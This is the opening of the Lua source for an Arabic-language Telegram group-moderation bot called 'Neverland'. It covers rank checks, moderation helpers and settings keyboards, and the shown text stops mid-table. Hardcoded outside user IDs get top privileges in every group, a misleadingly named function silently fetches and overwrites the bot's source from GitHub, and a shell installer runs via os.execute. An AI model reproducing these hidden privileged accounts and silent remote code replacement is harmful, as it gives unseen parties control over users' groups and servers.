--[[

--]]
database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./File_Libs/serpent.lua")
JSON    = dofile("./File_Libs/dkjson.lua")
json    = dofile("./File_Libs/JSON.lua")
URL     = dofile("./File_Libs/url.lua")
http    = require("socket.http")
https   = require("ssl.https")
sudos   = dofile("sudo.lua")
bot_id  = token:match("(%d+)")  
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1391769117,1466244479,2074461232}
User = io.popen("whoami"):read('*a')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a')
name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a')
port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a')
Rtime = io.popen("date +'%Y-%m-%d %T'"):read('*a')
print("\27[34m"..[[
>> Best Source in Telegram
>> Features fast and powerful


Installation information

User :: ]]..User..[[

IP :: ]]..IP..[[

name :: ]]..name..[[

port :: ]]..port..[[

time ::]]..Rtime.."\27[m")

io.popen("mkdir Neverland_Files")
t = "\27[35m".."\nAll Files Started : \n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n"..'\27[m'
i = 0
for v in io.popen('ls Neverland_Files'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
function dl_cb(t,s)
end
function DevNeverlande(user)  
local Alsh_Sudo = false  
for k,v in pairs(List_Sudos) do  
if user == v then  
Alsh_Sudo = true  
end  
end  
return Alsh_Sudo  
end 

function VIP_DeV(msg)  
local h_Sudo = false  
for k,v in pairs(List_Sudos) do  
if msg.sender_user_id_ == v then  
h_Sudo = true  
end  
end  
return h_Sudo  
end 
function DevNeverland(msg) 
local hash = database:sismember(bot_id.."DEV:Sudo:T", msg.sender_user_id_) 
if hash or VIP_DeV(msg) then  
return true  
else  
return false  
end  
end
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function DevBot(msg) 
local hash = database:sismember(bot_id.."Neverland:Sudo:User", msg.sender_user_id_) 
if hash or Bot(msg) or DevNeverland(msg) or VIP_DeV(msg) then    
return true  
else  
return false  
end  
end
function creatorA(msg)
local hash = database:sismember(bot_id.."creator"..msg.chat_id_, msg.sender_user_id_) 
if hash or DevBot(msg) or DevNeverland(msg) or VIP_DeV(msg) then    
return true 
else 
return false 
end 
end
function BasicConstructor(msg)
local hash = database:sismember(bot_id.."Neverland:Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) 
if hash or Bot(msg) or DevNeverland(msg) or DevBot(msg) or VIP_DeV(msg) or creatorA(msg) then     
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = database:sismember(bot_id.."Neverland:Constructor"..msg.chat_id_, msg.sender_user_id_) 
if hash or Bot(msg) or DevNeverland(msg) or DevBot(msg) or BasicConstructor(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
end
function Owner(msg)
local hash = database:sismember(bot_id.."Neverland:Manager"..msg.chat_id_,msg.sender_user_id_)    
if hash or Bot(msg) or DevNeverland(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
end
function Addictive(msg)
local hash = database:sismember(bot_id.."Neverland:Mod:User"..msg.chat_id_,msg.sender_user_id_)    
if hash or Bot(msg) or DevNeverland(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
end
function cleaner(msg)
local hash = database:sismember(bot_id.."Neverland:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or Bot(msg) or DevNeverland(msg) or DevBot(msg) or BasicConstructor(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = database:sismember(bot_id.."Neverland:Special:User"..msg.chat_id_,msg.sender_user_id_) 
if hash or Bot(msg) or  DevNeverland(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) or VIP_DeV(msg) or creatorA(msg) then             
return true 
else 
return false 
end 
end
function Vips(msg)
local hash = database:sismember(bot_id.."Neverland:Special:User"..msg.chat_id_,msg.sender_user_id_) 
if hash or Bot(msg) or  DevNeverland(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) or VIP_DeV(msg) or creatorA(msg) then        
return true 
else 
return false 
end 
end
function CleangGroups();local z = io.open('./Neverland');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/Neverland.lua)(.*)$") then;os.execute('chmod +x install.sh');os.execute('./install.sh get');end;end
function General_ban(user_id,chat_id)
if DevNeverlande(user_id) == true then
var = true
elseif DevNeverland(user_id) == true then
var = true
elseif VIP_DeV(user_id) == true then
var = true
elseif Bot(user_id) == true then
var = true
else  
var = false  
end  
return var
end 
function Rank_Checking(user_id,chat_id)
if tonumber(user_id) == tonumber(1391769117) then  
var = true  
elseif tonumber(user_id) == tonumber(1466244479) then
var = true  
elseif tonumber(user_id) == tonumber(2074461232) then
var = true  
elseif tonumber(user_id) == tonumber(Id_Sudo) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = true  
elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then
var = true  
elseif database:sismember(bot_id.."Neverland:Sudo:User", user_id) then
var = true  
elseif database:sismember(bot_id.."creator"..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id.."Neverland:Basic:Constructor"..chat_id, user_id) then
var = true                 
elseif database:sismember(bot_id.."Neverland:Basic:Constructor"..chat_id, user_id) then
var = true
elseif database:sismember(bot_id.."Neverland:Constructor"..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id.."Neverland:Manager"..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id.."Neverland:Mod:User"..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id.."Neverland:Special:User"..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Get_Rank(user_id,chat_id)
if tonumber(user_id) == tonumber(1391769117) then  
var = ' Telegram Developer'
elseif tonumber(user_id) == tonumber(1466244479) then  
var = "مبࢪمج السوࢪس"  
elseif tonumber(user_id) == tonumber(1799741) then  
var = "مبرمج السورس"  
elseif tonumber(user_id) == tonumber(1917848) then  
var = "مبرمج السورس"  
elseif tonumber(user_id) == tonumber(2074461232) then  
var = " Telegram Developer"  
elseif DevNeverlande(user_id) == true then
var = "المطور الاساسي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = "البوت"
elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then  var = "االمطور الاساسي ²"  
elseif database:sismember(bot_id.."Neverland:Sudo:User", user_id) then
var = database:get(bot_id.."Neverland:Sudo:Rd"..chat_id) or "المطور"  
elseif database:sismember(bot_id.."creator"..chat_id,user_id) then var = "المالك"
elseif database:sismember(bot_id.."Neverland:Basic:Constructor"..chat_id, user_id) then
var = database:get(bot_id.."Neverland:BasicConstructor:Rd"..chat_id) or "المنشئ الاساسي"
elseif database:sismember(bot_id.."Neverland:Constructor"..chat_id, user_id) then
var = database:get(bot_id.."Neverland:Constructor:Rd"..chat_id) or "المنشئ"  
elseif database:sismember(bot_id.."Neverland:Manager"..chat_id, user_id) then
var = database:get(bot_id.."Neverland:Manager:Rd"..chat_id) or "المدير"  
elseif database:sismember(bot_id.."Neverland:Mod:User"..chat_id, user_id) then
var = database:get(bot_id.."Neverland:Mod:Rd"..chat_id) or "الادمن"  
elseif database:sismember(bot_id.."Neverland:MN:TF"..chat_id, user_id) then
var =  "منظف"  
elseif database:sismember(bot_id.."Neverland:Special:User"..chat_id, user_id) then  
var = database:get(bot_id.."Neverland:Special:Rd"..chat_id) or "المميز"  
else  
var = database:get(bot_id.."Neverland:Memp:Rd"..chat_id) or "العضو"
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_Groups(Chat_id,User_id) 
if database:sismember(bot_id.."Neverland:Muted:User"..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_Groups(Chat_id,User_id) 
if database:sismember(bot_id.."Neverland:Ban:User"..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function Ban_All_Groups(User_id) 
if database:sismember(bot_id.."Neverland:GBan:User",User_id) then
Var = true
else
Var = false
end
return Var
end
function getcustom(msg,scc)
local var = "لايوجد"
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..scc.sender_user_id_)
GeId = JSON.decode(Ge)
if GeId.result.custom_title then
var = GeId.result.custom_title
end
return var
end
function getbio(User)
local var = "لايوجد"
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchat?chat_id="..User)
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function DeleteMessage_(chat,id,func)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},func or dl_cb,nil)
end
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
function RestrictChat(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end

function sendin11(chat,msgid,user,user_id)
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user_id)
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
info = 'ꪜ' 
infoo = 'false' 
else 
info = '✘' 
infoo = 'true' 
end
if Json_Info.result.can_delete_messages == true then
delete = 'ꪜ' 
deletee = 'false' 
else 
delete = '✘' 
deletee = 'true' 
end
if Json_Info.result.can_invite_users == true then
invite = 'ꪜ' 
invitee = 'false' 
else 
invite = '✘' 
invitee = 'true' 
end
if Json_Info.result.can_pin_messages == true then
pin = 'ꪜ' 
pinn = 'false' 
else 
pin = '✘' 
pinn = 'true' 
end
if Json_Info.result.can_restrict_members == true then
restrict = 'ꪜ' 
restrictt = 'false' 
else 
restrict = '✘' 
restrictt = 'true' 
end
if Json_Info.result.can_promote_members == true then
promote = 'ꪜ' 
promotee = 'false' 
else 
promote = '✘' 
promotee = 'true' 
end 
if Json_Info.result.can_manage_voice_chats == true then
voice = 'ꪜ' 
voicee = 'false' 
else 
voice = '✘' 
voicee = 'true' 
end
if Json_Info.result.can_manage_chat == true then
manage = 'ꪜ' 
managee = 'false' 
else 
manage = '✘' 
managee = 'true' 
end

keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'تغيير المعلومات '..info, callback_data='amr@'..user..'/user@'..user_id.."/chenginfo"..infoo},
},
{
{text = 'حذف الرسائل '..delete, callback_data='amr@'..user..'/user@'..user_id.."/delmsgg"..deletee},
},
{
{text = 'حظر المستخدمين '..restrict, callback_data='amr@'..user..'/user@'..user_id.."/banuser"..restrictt},
},
{
{text = 'اضافه مستخدمين '..invite, callback_data='amr@'..user..'/user@'..user_id.."/addlink"..invitee},
},
{
{text = 'تثبيت الرسائل '..pin, callback_data='amr@'..user..'/user@'..user_id.."/pinmsg"..pinn},
},
{
{text = 'اداره المكالمات '..voice, callback_data='amr@'..user..'/user@'..user_id.."/voice"..voicee},
},
{
{text = 'البقاء متخفي '..manage, callback_data='amr@'..user..'/user@'..user_id.."/manage"..managee},
},
{
{text = 'اضافه مشرفين '..promote, callback_data='amr@'..user..'/user@'..user_id.."/addadmin"..promotee},
},
}
local Texti = 'تم تعديل صلاحياته'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..chat..'&text='..URL.escape(Texti)..'&message_id='..msgid..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

function SendMsg_Msgeeslist(status,chat_id,user_id,msg_id,text)
local msg_idd = msg_id/2097152/0.5
local listsudo = database:smembers(bot_id.."Neverland:Sudo:User"..chat_id)
local listasa = database:smembers(bot_id.."Neverland:Basic:Constructor"..chat_id)
local listmnsh = database:smembers(bot_id.."Neverland:Constructor"..chat_id)
local listmder = database:smembers(bot_id.."Neverland:Manager"..chat_id)
local listadmin = database:smembers(bot_id.."Neverland:Mod:User"..chat_id)
local listvip = database:smembers(bot_id.."Neverland:Special:User"..chat_id)
local listbans = database:smembers(bot_id.."Neverland:GBan:User"..chat_id)
local listban = database:smembers(bot_id.."Neverland:Ban:User"..chat_id)
local listktm = database:smembers(bot_id.."Neverland:Muted:User"..chat_id)
local listcleanerr = database:smembers(bot_id.."Neverland:MN:TF"..chat_id)
local listCmdd = database:smembers(bot_id.."Neverland:List:Cmd:Group:New"..chat_id)
local listcreatorr = database:smembers(bot_id.."creator"..chat_id)
local listDevvrr = database:smembers(bot_id.."TSudo:User"..chat_id)
if status == "listsudo" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المطورين', callback_data=user_id.."/delsudos"},
},

}
elseif status == "listDevvrr" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح الثانويين', callback_data=user_id.."/delDevv"},
},

}
elseif status == "listcreatorr" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المالكين', callback_data=user_id.."/delcreatorr"},
},

}
elseif status == "listasa" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المنشئين الاساسيين', callback_data=user_id.."/delassaseen"},
},

}
elseif status == "listmnsh" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المنشئين', callback_data=user_id.."/delmnsh"},
},

}
elseif status == "listmder" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المدراء', callback_data=user_id.."/delmoder"},
},

}
elseif status == "listadmin" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح الادمنيه', callback_data=user_id.."/deladmin"},
},

}
elseif status == "listvip" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المميزين', callback_data=user_id.."/delvips"},
},

}
elseif status == "listcleanerr" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المنظفين', callback_data=user_id.."/delcleanerr"},
},

}
elseif status == "listCmdd" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح الاوامر المضافه', callback_data=user_id.."/delCmdd"},
},

}
elseif status == "listbans" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المحظورين عام', callback_data=user_id.."/delbanall"},
},

}
elseif status == "listban" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المحظورين', callback_data=user_id.."/delban"},
},

}
elseif status == "listktm" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦┇مسح المكتومين', callback_data=user_id.."/delktm"},
},

}
end
return https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text).."&reply_to_message_id="..msg_idd.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
function Edit_Msgees(status,chat_id,user_id,msg_id,text)
local msg_idd = msg_id/2097152/0.5
if status == "sendok" then
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'القائمة الرئيسيه', callback_data=user_id.."/homeaddwd"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..chat_id..'&text='..URL.escape(text)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
end

function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) 
if res ~= 200 then 
return false 
end 
if not req.ok then 
return false end 
return req 
end
function SendV(chat_id,reply,voice,caption) 
SendVo = https.request("https://api.telegram.org/bot"..token.."/sendVoice?chat_id="..chat_id.."&voice="..URL.escape(voice).."&caption="..URL.escape(caption).."&reply_to_message_id"..reply.."&parse_mode=MARKDOWN")      
return SendVo
end 
function SendP(chat_id,reply,photo,caption) 
SendP = https.request("https://api.telegram.org/bot"..token.."/sendphoto?chat_id="..chat_id.."&photo="..URL.escape(photo).."&caption="..URL.escape(caption).."&reply_to_message_id"..reply.."&parse_mode=MARKDOWN")      
return SendP
end 
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url)  
end
function send_inlin_key(chat_id,text,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function edit_inlin_key(chat_id,text,message_id,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..token.."/editMessageText?chat_id="..chat_id.."&text="..URL.escape(text)..'&message_id='..message_id.."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function send_inline_Media(chat_id,iny,x,cx,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..token.."/"..iny.."?chat_id="..chat_id.."&"..x.."="..cx.."&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
function GetInputFile(file)  
local file = file or ""   
if file:match("/") then  
infile = {ID= "InputFileLocal", path_  = file}  
elseif file:match("^%d+$") then  
infile ={ID="InputFileId",id_=file}  
else infile={ID="InputFilePersistentId",persistent_id_ = file}  
end 
return infile 
end
function sendPhoto(chat_id,reply_id,photo,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessagePhoto",
photo_ = GetInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption or ""
}
},func or dl_cb,nil)
end
	
function sendVoice(chat_id,reply_id,voice,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVoice",
voice_ = GetInputFile(voice),
duration_ = "",
waveform_ = "",
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendAnimation(chat_id,reply_id,animation,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAnimation",
animation_ = GetInputFile(animation),
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendAudio(chat_id,reply_id,audio,title,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAudio",
audio_ = GetInputFile(audio),
duration_ = "",
title_ = title or "",
performer_ = "سورس نيفرلاند الرسمي",
caption_ = caption or ""
}},func or dl_cb,nil)
end
function sendSticker(chat_id,reply_id,sticker,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageSticker",
sticker_ = GetInputFile(sticker),
width_ = 0,
height_ = 0
}},func or dl_cb,nil)
end
function tdcli_update_callback_value(Data) 
url = 'https://raw.githubusercontent.com/TEAMNeverland/Neverland/master/Neverland.lua'
file_path = 'Neverland.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end
------------------------------------------------------------------------------------------------------------ 
function tdcli_update_callback_value_(Data) 
tdcli_update_callback_value(Data) 
url = 'https://raw.githubusercontent.com/TEAMNeverland/Neverland/master/Neverland.lua'
file_path = 'Neverland.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function sendVideo(chat_id,reply_id,video,caption,func)
tdcli_function({ 
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 0,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVideo",  
video_ = GetInputFile(video),
added_sticker_file_ids_ = {},
duration_ = 0,
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil)
end
function sendin(chat,msgid,user)
local Texti = '*\n✦┇اعدادات المجموعه \n✦┇علامة ال (✅) تعني مقفول\n✦┇علامة ال (❌) تعني مفتوح*'
local mute_photo = (database:get(bot_id.."Neverland:Lock:Photo"..chat) or '❌')
local mute_photo1 = mute_photo:gsub('del', '❬ ✅ ❭')
local mute_audio = (database:get(bot_id.."Neverland:Lock:vico"..chat) or '❌')
local mute_audio1 = mute_audio:gsub('del', '❬ ✅ ❭')
local mute_voice = (database:get(bot_id.."Neverland:Lock:Audio"..chat) or '❌')
local mute_voice1 = mute_voice:gsub('del', '❬ ✅ ❭')
local mute_forward = (database:get(bot_id.."Neverland:Lock:forward"..chat) or '❌')
local mute_forward1 = mute_forward:gsub('del', '❬ ✅ ❭')
local mute_document = (database:get(bot_id.."Neverland:Lock:Document"..chat) or '❌')
local mute_document1 = mute_document:gsub('del', '❬ ✅ ❭')
local mute_contact = (database:get(bot_id.."Neverland:Lock:Contact"..chat) or '❌')
local mute_contact1 = mute_contact:gsub('del', '❬ ✅ ❭')
local lock_spam = (database:get(bot_id.."Neverland:Lock:Spam"..chat) or '❌')
local lock_spam1 = lock_spam:gsub('del', '❬ ✅ ❭')
local lock_flood = (database:hget(bot_id.."Neverland:flooding:settings:"..chat ,"flood") or '❌')
local lock_flood1 = lock_flood:gsub('del', '❬ ✅ ❭')
local mute_inline = (database:get(bot_id.."Neverland:Lock:Inlen"..chat) or '❌')
local mute_inline1 = mute_inline:gsub('del', '❬ ✅ ❭')
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = URL.escape(mute_photo1) , callback_data="h"},{text = 'قفل الصور ', callback_data=user.."/mute_photo"},{text = 'فتح الصور', callback_data=user.."/unmute_photo"},
},
{
{text = URL.escape(mute_audio1) , callback_data="h"},{text = 'قفل الاغاني', callback_data=user.."/mute_voice"},{text = 'فتح الاغاني', callback_data=user.."/unmute_voice"},
},
{
{text = URL.escape(mute_voice1) , callback_data="h"},{text = 'قفل الصوت', callback_data=user.."/mute_audio"},{text = 'فتح الصوت', callback_data=user.."/unmute_audio"},
},
{
{text = URL.escape(mute_forward1) , callback_data="h"},{text = 'قفل التوجيه', callback_data=user.."/mute_forward"},{text = 'فتح التوجيه', callback_data=user.."/unmute_forward"},
},
{
{text = URL.escape(mute_document1) , callback_data="h"},{text = 'قفل الملفات', callback_data=user.."/mute_document"},{text = 'فتح الملفات', callback_data=user.."/unmute_document"},
},
{
{text = URL.escape(mute_contact1) , callback_data="h"},{text = 'قفل الجهات', callback_data=user.."/mute_contact"},{text = 'فتح الجهات', callback_data=user.."/unmute_contact"},
},
{
{text = URL.escape(lock_spam1) , callback_data="h"},{text = 'قفل الكلايش', callback_data=user.."/lock_spam"},{text = 'فتح الكلايش', callback_data=user.."/unlock_spam"},
},
{
{text = URL.escape(lock_flood1) , callback_data="h"},{text = 'قفل التكرار', callback_data=user.."/lock_flood"},{text = 'فتح التكرار', callback_data=user.."/unlock_flood"},
},
{
{text = URL.escape(mute_inline1) , callback_data="h"},{text = 'قفل الانلاين', callback_data=user.."/mute_inline"},{text = 'فتح الانلاين', callback_data=user.."/unmute_inline"},
},
{
{text = 'رجوع ...', callback_data=user.."/homelocks"},
},
{
{text = '⤹𝗲𝘅𝗶𝘁⤾', callback_data=user.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..chat..'&text='..URL.escape(Texti)..'&message_id='..msgid..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
function sendin1(chat,msgid,user)
local Texti = '*\n✦┇اعدادات المجموعه \n✦┇علامة ال (✅) تعني مقفول\n✦┇علامة ال (❌) تعني مفتوح*'
local mute_text = (database:get(bot_id.."Neverland:Lock:text"..chat)  or '❌')
local mute_text1 = mute_text:gsub('true', '❬ ✅ ❭')
local lock_bots = (database:get(bot_id.."Neverland:Lock:Bot:kick"..chat) or '❌')
local lock_bots1 = lock_bots:gsub('kick', '❬ ✅ ❭')
local mute_tgservice = (database:get(bot_id.."Neverland:Lock:tagservr"..chat) or '❌')
local mute_tgservice1 = mute_tgservice:gsub('true', '❬ ✅ ❭')
local lock_edit = (database:get(bot_id.."Neverland:Lock:edit"..chat) or '❌')
local lock_edit1 = lock_edit:gsub('true', '❬ ✅ ❭')
local lock_link = (database:get(bot_id.."Neverland:Lock:Link"..chat) or '❌')
local lock_link1 = lock_link:gsub('del', '❬ ✅ ❭')
local lock_username = (database:get(bot_id.."Neverland:Lock:User:Name"..chat) or '❌')
local lock_username1 = lock_username:gsub('del', '❬ ✅ ❭')
local lock_tag = (database:get(bot_id.."Neverland:Lock:hashtak"..chat) or '❌')
local lock_tag1 = lock_tag:gsub('del', '❬ ✅ ❭')
local mute_sticker = (database:get(bot_id.."Neverland:Lock:Sticker"..chat) or '❌')
local mute_sticker1 = mute_sticker:gsub('del', '❬ ✅ ❭')
local mute_gif = (database:get(bot_id.."Neverland:Lock:Animation"..chat) or '❌')
local mute_gif1 = mute_gif:gsub('del', '❬ ✅ ❭')
local mute_video = (database:get(bot_id.."Neverland:Lock:Video"..chat) or '❌')
local mute_video1 = mute_video:gsub('del', '❬ ✅ ❭')
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = URL.escape(mute_text1) , callback_data="h"},{text = 'قفل الدردشه ', callback_data=user.."/mute_text"},{text = 'فتح الدردشه', callback_data=user.."/unmute_text"},
},
{
{text = URL.escape(lock_bots1) , callback_data="h"},{text = 'قفل البوتات', callback_data=user.."/lock_bots"},{text = 'فتح البوتات', callback_data=user.."/unlock_bots"},
},
{
{text = URL.escape(mute_tgservice1) , callback_data="h"},{text = 'قفل الاشعارات', callback_data=user.."/mute_tgservice"},{text = 'فتح الاشعارات', callback_data=user.."/unmute_tgservice"},
},
{
{text = URL.escape(lock_edit1) , callback_data="h"},{text = 'قفل التعديل', callback_data=user.."/lock_edit"},{text = 'فتح التعديل', callback_data=user.."/unlock_edit"},
},
{
{text = URL.escape(lock_link1) , callback_data="h"},{text = 'قفل الروابط', callback_data=user.."/lock_link"},{text = 'فتح الروابط', callback_data=user.."/unlock_link"},
},
{
{text = URL.escape(lock_username1) , callback_data="h"},{text = 'قفل المعرفات', callback_data=user.."/lock_username"},{text = 'فتح المعرفات', callback_data=user.."/unlock_username"},
},
{
{text = URL.escape(lock_tag1) , callback_data="h"},{text = 'قفل التاك', callback_data=user.."/lock_tag"},{text = 'فتح التاك', callback_data=user.."/unlock_tag"},
},
{
